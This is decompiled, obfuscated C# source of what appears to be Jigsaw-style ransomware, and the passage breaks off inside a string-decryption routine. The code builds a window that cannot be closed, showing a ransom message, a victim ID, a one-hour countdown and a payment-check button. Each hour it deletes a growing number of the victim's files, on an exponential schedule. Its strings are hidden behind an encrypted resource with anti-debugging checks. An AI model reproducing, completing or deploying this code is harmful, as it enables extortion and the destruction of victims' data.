using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;

internal sealed class _0002<_0002, _0003>
{
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private readonly _0002 m__0002;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private readonly _0003 m__0003;

	[DebuggerHidden]
	public _0002(_0002 _0002, _0003 _0003)
	{
		this._0002 = _0002;
		this._0003 = _0003;
	}

	public _0002 _0002()
	{
		return this._0002;
	}

	public _0003 _0003()
	{
		return this._0003;
	}

	[DebuggerHidden]
	public override bool Equals(object _0002)
	{
		if (_0002 is global::_0002<_0002, _0003> obj && EqualityComparer<_0002>.Default.Equals(this._0002, obj._0002))
		{
			return EqualityComparer<_0003>.Default.Equals(this._0003, obj._0003);
		}
		return false;
	}

	[DebuggerHidden]
	public override int GetHashCode()
	{
		return (1808562653 + EqualityComparer<_0002>.Default.GetHashCode(this._0002)) * -1521134295 + EqualityComparer<_0003>.Default.GetHashCode(this._0003);
	}

	[DebuggerHidden]
	public override string ToString()
	{
		return string.Format(null, _0003_2002._0002(-1022257714), new object[2]
		{
			this._0002?.ToString(),
			this._0003?.ToString()
		});
	}
}
internal interface _0002_2000<_0002> : _000E, _000F
{
	[SpecialName]
	new _0002 _000E_200A_2005_2008_0002();
}
public sealed class _0002_2001 : Form
{
	[Serializable]
	private sealed class _0002
	{
		public static readonly _0002 _0002 = new _0002();

		public static Func<string, Guid> _0003;

		internal Guid _0002(string _0002)
		{
			return Guid.NewGuid();
		}
	}

	private static int m__0002;

	private static int m__0003;

	private static int m__0005;

	private IContainer m__0008;

	private Label m__0006;

	private Timer _000E;

	private Label _000F;

	private TextBox _0002_2000;

	private Button _0003_2000;

	private Button _0005_2000;

	private Timer _0008_2000;

	private Label _0006_2000;

	private Label _000E_2000;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public _0002_2001()
	{
		this._0002();
	}

	private void _0002(object _0002, EventArgs _0003)
	{
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		_000F_2001._0002((Form)(object)this);
		_000E.set_Interval(125);
		_000E.set_Enabled(true);
		((Control)this.m__0006).set_Text(string.Empty);
		((Control)_000F).set_Text(global::_0006_2000._0003_2001);
		((Control)_000F).set_Visible(false);
		((TextBoxBase)_0002_2000).set_ReadOnly(true);
		((Control)_0002_2000).set_Text(_0002_2001._0002());
		((Control)_0002_2000).set_Visible(false);
		((Control)_0003_2000).set_Visible(false);
		((Control)_0005_2000).set_Visible(false);
		((Control)_0006_2000).set_Visible(false);
		_0008_2000.set_Enabled(false);
		((Control)_000E_2000).set_Visible(false);
		if (_0002_2001._0002())
		{
			_0002_2001._0002(1000);
		}
	}

	private static bool _0002()
	{
		string path = Path.Combine(global::_0006_2000._0005_2000, _0003_2002._0002(-1022258482));
		if (File.Exists(path))
		{
			return true;
		}
		File.WriteAllText(path, _0003_2002._0002(-1022258489));
		return false;
	}

	private static void _0002(int _0002)
	{
		try
		{
			int num = 0;
			foreach (string item in _000E_2001._0002())
			{
				if (num == _0002)
				{
					break;
				}
				File.Delete(item + _0003_2002._0002(-1022258261));
				num++;
			}
		}
		catch (Exception)
		{
		}
	}

	private static string _0002()
	{
		string path = Path.Combine(global::_0006_2000._0005_2000, _0003_2002._0002(-1022258468));
		if (File.Exists(path))
		{
			return File.ReadAllText(path);
		}
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in _0005_2001._0005().Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		string text = hashSet.OrderBy(_0002_2001._0002._0002._0002).FirstOrDefault();
		File.WriteAllText(path, text);
		return text;
	}

	private void _0002(object _0002, FormClosingEventArgs _0003)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)_0003).Cancel = true;
		MessageBox.Show((IWin32Window)(object)this, _0003_2002._0002(-1022258462));
	}

	private void _0003(object _0002, EventArgs _0003)
	{
		string text = global::_0006_2000._0002_2001;
		((Control)this.m__0006).set_Text(text.Substring(0, _0002_2001.m__0005) + _0003_2002._0002(-1022258502));
		_0002_2001.m__0005++;
		if (_0002_2001.m__0005 == text.Length + 1)
		{
			_000E.set_Enabled(false);
			((Control)_000F).set_Visible(true);
			((Control)_0002_2000).set_Visible(true);
			((Control)_0003_2000).set_Visible(true);
			((Control)_0005_2000).set_Visible(true);
			((Control)_0006_2000).set_Visible(true);
			_0008_2000.set_Enabled(true);
			((Control)_000E_2000).set_Visible(true);
			_0002_2001.m__0002 = 3600;
		}
	}

	private void _0005(object _0002, EventArgs _0003)
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			double num = _0008_2001._0002();
			int num2 = (int)(_0008_2001._0002(_0002_2001._0002()) * num);
			if (num2 > global::_0006_2000._0005_2001)
			{
				_0008_2000.Stop();
				((Control)_0003_2000).set_Enabled(false);
				((Control)_0003_2000).set_BackColor(Color.Lime);
				((Control)_0003_2000).set_Text(_0003_2002._0002(-1022258510));
				MessageBox.Show((IWin32Window)(object)this, _0003_2002._0002(-1022258580), _0003_2002._0002(-1022255636));
				_000E_2001._0002(_0003_2002._0002(-1022258261));
				_0006_2001._0002();
			}
			else if (num2 > 0)
			{
				((Control)_0003_2000).set_BackColor(Color.Tomato);
				((Control)_0003_2000).set_Text(_0003_2002._0002(-1022255620));
			}
			else
			{
				((Control)_0003_2000).set_BackColor(Color.Tomato);
				((Control)_0003_2000).set_Text(_0003_2002._0002(-1022255703));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
			((Control)_0003_2000).set_Text(_0003_2002._0002(-1022255784));
			((Control)_0003_2000).set_BackColor(Color.Tomato);
		}
	}

	private void _0008(object _0002, EventArgs _0003)
	{
		((Form)new _000F_2000()).Show((IWin32Window)(object)this);
	}

	private void _0006(object _0002, EventArgs _0003)
	{
		if (_0002_2001.m__0002 > 0)
		{
			_0002_2001.m__0002--;
			int num = _0002_2001.m__0002 / 60;
			int num2 = _0002_2001.m__0002 % 60;
			((Control)_0006_2000).set_Text(num + _0003_2002._0002(-1022255860) + num2);
		}
		else
		{
			_0002_2001.m__0002 = 3600;
			int num3 = (int)Math.Pow(1.1, _0002_2001.m__0003);
			((Control)_000E_2000).set_Text(num3 + _0003_2002._0002(-1022255868));
			_0002_2001.m__0003++;
			_0002_2001._0002(num3);
		}
	}

	protected override void Dispose(bool _0002)
	{
		if (_0002 && this.m__0008 != null)
		{
			this.m__0008.Dispose();
		}
		((Form)this).Dispose(_0002);
	}

	private void _0002()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Expected O, but got Unknown
		//IL_03f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fb: Expected O, but got Unknown
		//IL_04a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ab: Expected O, but got Unknown
		//IL_05ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f4: Expected O, but got Unknown
		this.m__0008 = new Container();
		this.m__0006 = new Label();
		_000E = new Timer(this.m__0008);
		_000F = new Label();
		_0002_2000 = new TextBox();
		_0003_2000 = new Button();
		_0005_2000 = new Button();
		_0008_2000 = new Timer(this.m__0008);
		_0006_2000 = new Label();
		_000E_2000 = new Label();
		((Control)this).SuspendLayout();
		((Control)this.m__0006).set_AutoSize(true);
		((Control)this.m__0006).set_BackColor(Color.Black);
		((Control)this.m__0006).set_Font(new Font(_0003_2002._0002(-1022255839), 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this.m__0006).set_ForeColor(Color.Lime);
		((Control)this.m__0006).set_Location(new Point(25, 29));
		((Control)this.m__0006).set_Name(_0003_2002._0002(-1022255926));
		((Control)this.m__0006).set_Size(new Size(218, 16));
		((Control)this.m__0006).set_TabIndex(0);
		((Control)this.m__0006).set_Text(_0003_2002._0002(-1022255911));
		_000E.add_Tick((EventHandler)_0003);
		((Control)_000F).set_AutoSize(true);
		((Control)_000F).set_BackColor(Color.Black);
		((Control)_000F).set_Font(new Font(_0003_2002._0002(-1022255839), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_000F).set_ForeColor(Color.Lime);
		((Control)_000F).set_Location(new Point(25, 505));
		((Control)_000F).set_Name(_0003_2002._0002(-1022255899));
		((Control)_000F).set_Size(new Size(239, 16));
		((Control)_000F).set_TabIndex(1);
		((Control)_000F).set_Text(_0003_2002._0002(-1022255883));
		((Control)_0002_2000).set_Location(new Point(28, 524));
		((Control)_0002_2000).set_Name(_0003_2002._0002(-1022255983));
		((Control)_0002_2000).set_Size(new Size(348, 20));
		((Control)_0002_2000).set_TabIndex(2);
		((Control)_0002_2000).set_Text(_0003_2002._0002(-1022255942));
		((Control)_0003_2000).set_BackColor(Color.Gold);
		((Control)_0003_2000).set_Location(new Point(28, 551));
		((Control)_0003_2000).set_Name(_0003_2002._0002(-1022256037));
		((Control)_0003_2000).set_Size(new Size(348, 33));
		((Control)_0003_2000).set_TabIndex(3);
		((Control)_0003_2000).set_Text(_0003_2002._0002(-1022256032));
		((ButtonBase)_0003_2000).set_UseVisualStyleBackColor(false);
		((Control)_0003_2000).add_Click((EventHandler)_0005);
		((Control)_0005_2000).set_BackColor(Color.Gray);
		((Control)_0005_2000).set_Location(new Point(28, 479));
		((Control)_0005_2000).set_Name(_0003_2002._0002(-1022256105));
		((Control)_0005_2000).set_Size(new Size(348, 23));
		((Control)_0005_2000).set_TabIndex(4);
		((Control)_0005_2000).set_Text(_0003_2002._0002(-1022256074));
		((ButtonBase)_0005_2000).set_UseVisualStyleBackColor(false);
		((Control)_0005_2000).add_Click((EventHandler)_0008);
		_0008_2000.set_Interval(1000);
		_0008_2000.add_Tick((EventHandler)_0006);
		((Control)_0006_2000).set_AutoSize(true);
		((Control)_0006_2000).set_BackColor(Color.Black);
		_0006_2000.set_BorderStyle((BorderStyle)2);
		((Control)_0006_2000).set_Font(new Font(_0003_2002._0002(-1022255139), 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_0006_2000).set_ForeColor(Color.DarkRed);
		((Control)_0006_2000).set_Location(new Point(28, 320));
		((Control)_0006_2000).set_Name(_0003_2002._0002(-1022255109));
		((Control)_0006_2000).set_Size(new Size(220, 80));
		((Control)_0006_2000).set_TabIndex(5);
		((Control)_0006_2000).set_Text(_0003_2002._0002(-1022255220));
		((Control)_000E_2000).set_AutoSize(true);
		((Control)_000E_2000).set_BackColor(Color.Black);
		((Control)_000E_2000).set_Font(new Font(_0003_2002._0002(-1022255839), 12f, (FontStyle)1));
		((Control)_000E_2000).set_ForeColor(Color.Lime);
		((Control)_000E_2000).set_Location(new Point(24, 455));
		((Control)_000E_2000).set_Name(_0003_2002._0002(-1022255208));
		((Control)_000E_2000).set_Size(new Size(261, 16));
		((Control)_000E_2000).set_TabIndex(6);
		((Control)_000E_2000).set_Text(_0003_2002._0002(-1022255199));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)_0005_2001._0002());
		((Form)this).set_ClientSize(new Size(840, 596));
		((Control)this).get_Controls().Add((Control)(object)_000E_2000);
		((Control)this).get_Controls().Add((Control)(object)_0006_2000);
		((Control)this).get_Controls().Add((Control)(object)_0005_2000);
		((Control)this).get_Controls().Add((Control)(object)_0003_2000);
		((Control)this).get_Controls().Add((Control)(object)_0002_2000);
		((Control)this).get_Controls().Add((Control)(object)_000F);
		((Control)this).get_Controls().Add((Control)(object)this.m__0006);
		((Control)this).set_Name(_0003_2002._0002(-1022255293));
		((Form)this).add_FormClosing(new FormClosingEventHandler(_0002));
		((Form)this).add_Load((EventHandler)_0002);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
internal interface _0002_2002
{
}
internal sealed class _0003<_0002, _0003>
{
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private readonly _0002 m__0002;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private readonly _0003 m__0003;

	[DebuggerHidden]
	public _0003(_0002 _0002, _0003 _0003)
	{
		this._0002 = _0002;
		this._0003 = _0003;
	}

	public _0002 _0002()
	{
		return this._0002;
	}

	public _0003 _0003()
	{
		return this._0003;
	}

	[DebuggerHidden]
	public override bool Equals(object _0002)
	{
		if (_0002 is global::_0003<_0002, _0003> obj && EqualityComparer<_0002>.Default.Equals(this._0002, obj._0002))
		{
			return EqualityComparer<_0003>.Default.Equals(this._0003, obj._0003);
		}
		return false;
	}

	[DebuggerHidden]
	public override int GetHashCode()
	{
		return (1248723071 + EqualityComparer<_0002>.Default.GetHashCode(this._0002)) * -1521134295 + EqualityComparer<_0003>.Default.GetHashCode(this._0003);
	}

	[DebuggerHidden]
	public override string ToString()
	{
		return string.Format(null, _0003_2002._0002(-1022257684), new object[2]
		{
			this._0002?.ToString(),
			this._0003?.ToString()
		});
	}
}
internal static class _0003_2000
{
}
internal static class _0003_2001
{
	[STAThread]
	private static void _0002(string[] _0002)
	{
		try
		{
			_0006_2001._0002(_0006_2000._0002, (_0002.Length == 1) ? _0002[0] : null);
			new _000E_2000();
			Application.Run();
		}
		catch
		{
		}
	}
}
internal static class _0003_2002
{
	private enum _0002_2006_200B_2008_2002_2002_2007_2005_200A_2002_2005_2009_200B_2006_2002_2000_2003_2009_2007_2000_2006_2006_2001_2000
	{

	}

	internal sealed class _0002_2008_2006_2006_2000_2007_2006_2002_2002_2007_2005_200B_2004
	{
		private struct _0002
		{
			public int _0002;

			public string _0003;
		}

		private _0002[] m__0002;

		private int _0003;

		public _0002_2008_2006_2006_2000_2007_2006_2002_2002_2007_2005_200B_2004()
		{
			this.m__0002 = new _0002[16];
		}

		public _0002_2008_2006_2006_2000_2007_2006_2002_2002_2007_2005_200B_2004(int _0002)
		{
			int num = 16;
			_0002 <<= 1;
			while (num < _0002 && num > 0)
			{
				num <<= 1;
			}
			if (num < 0)
			{
				num = 16;
			}
			this.m__0002 = new _0002[num];
		}

		public int _0002()
		{
			return _0003;
		}

		private void _0002()
		{
			_0002[] array = this.m__0002;
			int num = array.Length;
			int num2 = num * 2;
			if (num2 <= 0)
			{
				return;
			}
			_0002[] array2 = new _0002[num2];
			int num3 = 0;
			for (int i = 0; i < num; i++)
			{
				string text = array[i]._0003;
				if (text == null)
				{
					continue;
				}
				int num4 = array[i]._0002;
				int num5 = num4 & (num2 - 1);
				while (array2[num5]._0003 != null)
				{
					num5++;
					if (num5 >= num2)
					{
						num5 = 0;
					}
				}
				array2[num5]._0003 = text;
				array2[num5]._0002 = num4;
				num3++;
			}
			this.m__0002 = array2;
			_0003 = num3;
		}

		public string _0002(int _0002)
		{
			_0002[] array = this.m__0002;
			int num = array.Length;
			int num2 = _0002 & (num - 1);
			string result = null;
			while (true)
			{
				if (array[num2]._0002 == _0002)
				{
					result = array[num2]._0003;
					break;
				}
				if (array[num2]._0003 == null)
				{
					break;
				}
				num2++;
				if (num2 >= num)
				{
					num2 = 0;
				}
			}
			return result;
		}

		public void _0002(int _0002, string _0003)
		{
			_0002[] array = this.m__0002;
			int num = array.Length;
			int num2 = num >> 1;
			int num3 = _0002 & (num - 1);
			bool flag;
			while (true)
			{
				int num4 = array[num3]._0002;
				flag = array[num3]._0003 == null;
				if (num4 == _0002 || flag)
				{
					break;
				}
				num3++;
				if (num3 >= num)
				{
					num3 = 0;
				}
			}
			array[num3]._0003 = _0003;
			if (flag)
			{
				array[num3]._0002 = _0002;
				this._0003++;
				if (this._0003 > num2)
				{
					this._0002();
				}
			}
		}
	}

	private sealed class _000F_2003_200A_2001_2003_2003_2004_200B_2009_200B_2009_2008_2000_2006_2000_2003_2000_2007_2009_2005_200B_2008_2007
	{
		private Stream m__0002;

		private byte[] m__0003;

		public _000F_2003_200A_2001_2003_2003_2004_200B_2009_200B_2009_2008_2000_2006_2000_2003_2000_2007_2009_2005_200B_2008_2007(Stream _0002)
		{
			this.m__0002 = _0002;
			this.m__0003 = new byte[4];
		}

		public Stream _0002()
		{
			return this.m__0002;
		}

		public short _0002()
		{
			this._0002(2);
			return (short)(this.m__0003[0] | (this.m__0003[1] << 8));
		}

		public int _0002()
		{
			this._0002(4);
			return this.m__0003[0] | (this.m__0003[1] << 8) | (this.m__0003[2] << 16) | (this.m__0003[3] << 24);
		}

		private void _0002()
		{
			throw new EndOfStreamException();
		}

		private void _0002(int _0002)
		{
			int num = 0;
			int num2 = 0;
			if (_0002 == 1)
			{
				num2 = this.m__0002.ReadByte();
				if (num2 == -1)
				{
					this._0002();
				}
				this.m__0003[0] = (byte)num2;
				return;
			}
			do
			{
				num2 = this.m__0002.Read(this.m__0003, num, _0002 - num);
				if (num2 == 0)
				{
					this._0002();
				}
				num += num2;
			}
			while (num < _0002);
		}

		public void _0003()
		{
			Stream stream = this.m__0002;
			this.m__0002 = null;
			stream?.Close();
			this.m__0003 = null;
		}

		public byte[] _0002(int _0002)
		{
			if (_0002 < 0)
			{
				throw new ArgumentOutOfRangeException();
			}
			byte[] array = new byte[_0002];
			int num = 0;
			do
			{
				int num2 = this.m__0002.Read(array, num, _0002);
				if (num2 == 0)
				{
					break;
				}
				num += num2;
				_0002 -= num2;
			}
			while (_0002 > 0);
			if (num != array.Length)
			{
				byte[] array2 = new byte[num];
				Buffer.BlockCopy(array, 0, array2, 0, num);
				array = array2;
			}
			return array;
		}
	}

	private static _000F_2003_200A_2001_2003_2003_2004_200B_2009_200B_2009_2008_2000_2006_2000_2003_2000_2007_2009_2005_200B_2008_2007 m__0003;

	private static byte[] _0005;

	private static _0002_2006_200B_2008_2002_2002_2007_2005_200A_2002_2005_2009_200B_2006_2002_2000_2003_2009_2007_2000_2006_2006_2001_2000 _0003_2000;

	private static short _0008;

	private static int _0002_2000;

	private static int _000F;

	private static _0002_2008_2006_2006_2000_2007_2006_2002_2002_2007_2005_200B_2004 m__0002;

	private static int _0006;

	private static byte[] _000E;

	[MethodImpl(MethodImplOptions.NoInlining)]
	static _0003_2002()
	{
		int num = -560104555;
		int num2 = 309786108 - num;
		_0003_2002.m__0002 = new _0002_2008_2006_2006_2000_2007_2006_2002_2002_2007_2005_200B_2004(num + 1429995315 - num2);
		int num3 = 1;
		StackTrace stackTrace = new StackTrace(num3, fNeedFileInfo: false);
		num3--;
		StackFrame frame = stackTrace.GetFrame(num3);
		int num4 = ~(-(-(~(~(-(~(-(~((263292049 - num) ^ num2))))))))) ^ -(~(~(-(~(-(~(-(~((num ^ -8231147) - num2)))))))));
		MethodBase methodBase = frame?.GetMethod();
		if (frame != null)
		{
			num4 ^= ~(-(-(~(~(-(~(-(~(-(~((-62970 + num) ^ num2)))))))))));
		}
		Type type = methodBase?.DeclaringType;
		if ((object)type == typeof(RuntimeMethodHandle))
		{
			num4 ^= (-314309093 ^ num) - num2 + num3;
			_0003_2000 = (_0002_2006_200B_2008_2002_2002_2007_2005_200A_2002_2005_2009_200B_2006_2002_2000_2003_2009_2007_2000_2006_2006_2001_2000)4 | _0003_2000;
		}
		else if ((object)type == null)
		{
			_0003_2000 |= (_0002_2006_200B_2008_2002_2002_2007_2005_200A_2002_2005_2009_200B_2006_2002_2000_2003_2009_2007_2000_2006_2006_2001_2000)1;
			num4 ^= -(~(~(-(~(-(~(-(~(-(~((-309814900 + num) ^ num2)))))))))));
		}
		else if ((object)type.Assembly != typeof(_0003_2002).Assembly)
		{
			_0003_2000 |= (_0002_2006_200B_2008_2002_2002_2007_2005_200A_2002_2005_2009_200B_2006_2002_2000_2003_2009_2007_2000_2006_2006_2001_2000)2;
			num4 ^= (0x29CD8317 ^ num) + num2;
		}
		else
		{
			num4 ^= ~(-(-(~(~(-(-(~(-(~(~(num + 1429971182 - num2))))))))))) - num3;
			_0003_2000 = (_0002_2006_200B_2008_2002_2002_2007_2005_200A_2002_2005_2009_200B_2006_2002_2000_2003_2009_2007_2000_2006_2006_2001_2000)16 | _0003_2000;
		}
		_0002_2000 = num4 + _0002_2000;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static string _0002(int _0002)
	{
		lock (_0003_2002.m__0002)
		{
			string text = _0003_2002.m__0002._0002(_0002);
			if (text != null)
			{
				return text;
			}
			return _0003(_0002);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static string _0003(int _0002)
	{
		int num = 306977872;
		int num2 = num + -1301185917;
		string text = null;
		byte[] array;
		int num18;
		while (true)
		{
			int num6;
			if (_0003_2002.m__0003 == null)
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				Assembly callingAssembly = Assembly.GetCallingAssembly();
				_0006 |= -685619803 - num - num2;
				StringBuilder stringBuilder = new StringBuilder();
				int num3 = 1224633571 + num + num2;
				stringBuilder.Append((char)(num3 >> 16)).Append((char)num3);
				num3 = (-150482137 - num) ^ num2;
				stringBuilder.Append((char)num3).Append((char)(num3 >> 16));
				num3 = -763848059 + num - num2;
				stringBuilder.Append((char)(num3 >> 16)).Append((char)num3);
				num3 = (-150613215 - num) ^ num2;
				stringBuilder.Append((char)(num3 >> 16)).Append((char)num3);
				num3 = num + 1224371429 + num2;
				stringBuilder.Append((char)(num3 >> 16)).Append((char)num3);
				num3 = -150088916 - num - num2;
				stringBuilder.Append((char)num3).Append((char)(num3 >> 16));
				Stream? manifestResourceStream = executingAssembly.GetManifestResourceStream(stringBuilder.ToString());
				int num4 = 2;
				StackTrace stackTrace = new StackTrace(num4, fNeedFileInfo: false);
				_0006 ^= (-688811067 ^ num ^ num2) | num4;
				num4 -= 2;
				StackFrame frame = stackTrace.GetFrame(num4);
				MethodBase methodBase = frame?.GetMethod();
				_0006 ^= num4 + (-687230045 - num - num2);
				Type type = methodBase?.DeclaringType;
				if (frame == null)
				{
					_0006 ^= (num ^ 0x2909DDB0) + num2;
				}
				bool flag = (object)type == typeof(RuntimeMethodHandle);
				_0006 ^= -687230013 - num - num2;
				if (!flag)
				{
					flag = (object)type == null;
					if (flag)
					{
						_0006 ^= num + 687449456 + num2;
					}
				}
				if (flag == (stackTrace != null))
				{
					_0006 = 0x20 ^ _0006;
				}
				_0006 ^= (num ^ -688811035 ^ num2) | (num4 + 1);
				_0003_2002.m__0003 = new _000F_2003_200A_2001_2003_2003_2004_200B_2009_200B_2009_2008_2000_2006_2000_2003_2000_2007_2009_2005_200B_2008_2007(manifestResourceStream);
				short num5 = (short)(_0003_2002.m__0003._0002() ^ (short)(~(-(-(~(~(-(~(-(~(-(~(1301212986 - num + num2)))))))))))));
				if (num5 == 0)
				{
					_0008 = (short)(_0003_2002.m__0003._0002() ^ (short)(~(-(-(~(-(~(~(-(-(~(~((687224987 + num) ^ num2)))))))))))));
				}
				else
				{
					_0005 = _0003_2002.m__0003._0002(num5);
				}
				callingAssembly = executingAssembly;
				AssemblyName assemblyName;
				try
				{
					assemblyName = callingAssembly.GetName();
				}
				catch
				{
					assemblyName = new AssemblyName(callingAssembly.FullName);
				}
				_000E = assemblyName.GetPublicKeyToken();
				if (_000E != null && _000E.Length == 0)
				{
					_000E = null;
				}
				num6 = _0002_2000;
				_0002_2000 = 0;
				num6 ^= 980749955 - num - num2;
				long num7 = _0008_2002._0002();
				num6 ^= (int)num7;
				num6 ^= (0x74F63B2C ^ num) + num2;
				num6 ^= 9432505 - num - num2;
				int num8 = num6;
				int num9 = num8;
				int num10 = num9 ^ (num ^ 0x7CDCD29C ^ num2);
				int num11 = 1301186034 - num + num2;
				int num12 = num10;
				global::_0002_2000<int> obj2 = ((global::_0006<int>)new _0005._0008(num + -1301185919 - num2)
				{
					_0006 = num12
				})._0008_200A_2005_2008_0002();
				try
				{
					while (((_000E)obj2)._000E_200A_2005_2008_0002())
					{
						int num13 = obj2._000E_200A_2005_2008_0002();
						num10 ^= num13 - num11;
						num11 -= 3 + num10 >> 8;
					}
				}
				finally
				{
					obj2?._000F_200A_2005_2008_0002();
				}
				int num14 = num10;
				num6 ^= -(~(~(-(-(~(~(-(-(~(~(266566698 - num + num2)))))))))));
				int num15 = (1301191210 - num + num2) * num14 % ((-735512432 ^ num) - num2);
				num6 = (_000F = num6 + num15);
				_0006 = (_0006 & ((num + -1191817903) ^ num2)) ^ (-687223385 - num - num2);
				if (((uint)_0003_2000 & (uint)(-(~(-(~(~(-(~(-(~(-(~(0x290E756D ^ num ^ num2))))))))))))) == 0)
				{
					_0006 = -687186211 - num - num2;
				}
			}
			else
			{
				num6 = _000F;
			}
			if (_0006 == 687274135 + num + num2)
			{
				return new string(new char[3]
				{
					(char)((num ^ -688813189) - num2),
					'0',
					(char)((-687230245 - num) ^ num2)
				});
			}
			int num16 = _0002 ^ (-1256602110 + num - num2) ^ num6;
			num16 ^= (266941633 - num) ^ num2;
			_0003_2002.m__0003._0002().Position = num16;
			if (_0005 != null)
			{
				array = _0005;
			}
			else
			{
				short num17 = ((_0008 != -1) ? _0008 : ((short)(_0003_2002.m__0003._0002() ^ (687225415 + num + num2) ^ num16)));
				if (num17 == 0)
				{
					array = null;
				}
				else
				{
					array = _0003_2002.m__0003._0002(num17);
					for (int i = 0; i != array.Length; i++)
					{
						array[i] ^= (byte)(_000F >> ((i & 3) << 3));
					}
				}
			}
			num18 = _0003_2002.m__0003._0002() ^ num16 ^ -(~(-(~(-(~(~(-(-(~(~(745163130 - num - num2))))))))))) ^ num6;
			if (num18 != num + 687230171 + num2)
			{
				break;
			}
			byte[] array2 = _0003_2002.m__0003._0002(4);
			_0002 = (-2119623474 - num - num2) ^ num6;
			_0002 = (array2[2] | (array2[3] << 16) | (array2[0] << 8) | (array2[1] << 24)) ^ -_0002;
			text = _0003_2002.m__0002._0002(_0002);
			if (text != null)
			{
				return text;
			}
		}
		bool flag2 = (num18 & ((1920039555 + num) ^ num2)) != 0;
		bool flag3 = (num18 & (1460253475 - num - num2)) != 0;
		bool flag4 = (num18 & ((-764315005 + num) ^ num2)) != 0;
		num18 &= 1569621372 - num + num2;
		byte[] array3 = array;
		byte[] array4 = _0003_2002.m__0003._0002(num18);
		byte[] array5 = array3;
		byte b = array5[1];
		int num19 = array4.Length;
		byte b2 = (byte)((num19 + 11) ^ (b + 7));
		uint num20 = (uint)((array5[0] | (array5[2] << 8)) + (b2 << 3));
		ushort num21 = 0;
		int num22 = 0;
		while (num22 < num19)
		{
			if ((num22 & 1) == 0)
			{
				num20 = (uint)((int)num20 * (num + -1300971904 - num2) + ((num ^ 0x29251BA0) + num2));
				num21 = (ushort)(num20 >> 16);
			}
			byte b3 = (byte)num21;
			num21 = (ushort)(num21 >> 8);
			byte b4 = array4[num22];
			array4[num22] = (byte)(b4 ^ b ^ (3 + b2) ^ b3);
			num22++;
			b2 = b4;
		}
		byte[] array6 = array4;
		if (_000E != null != (_0006 != num + -1299578103 - num2))
		{
			for (int num23 = 0; num23 < num18; num23 = 1 + num23)
			{
				byte b5 = _000E[num23 & 7];
				b5 = (byte)((b5 << 3) | (b5 >> 5));
				array6[num23] = (byte)(array6[num23] ^ b5);
			}
		}
		int num24 = _0006 - 12;
		byte[] array7;
		int num25;
		if (!flag3)
		{
			array7 = array6;
			num25 = num18;
		}
		else
		{
			num25 = array6[2] | (array6[0] << 16) | (array6[3] << 8) | (array6[1] << 24);
			array7 = new byte[num25];
			_0003_2002._0002(array6, 4, array7);
		}
		if (flag2 && num24 == (num ^ 0x2916EDF7) + num2)
		{
			char[] array8 = new char[num25];
			for (int num26 = 0; num26 < num25; num26 = 1 + num26)
			{
				array8[num26] = (char)array7[num26];
			}
			text = new string(array8);
		}
		else
		{
			text = Encoding.Unicode.GetString(array7, 0, array7.Length);
		}
		num24 += -687230046 - num - num2 + (num24 & 3) << 5;
		if (num24 != ((-1302793735 + num) ^ num2))
		{
			int num27 = (num18 + _0002) ^ (-686293605 - num - num2) ^ (num24 & (num ^ -688812146 ^ num2));
			StringBuilder stringBuilder = new StringBuilder();
			int num3 = 687230261 + num + num2;
			stringBuilder.Append((char)(byte)num3);
			text = num27.ToString(stringBuilder.ToString());
		}
		if (!flag4)
		{
			text = string.Intern(text);
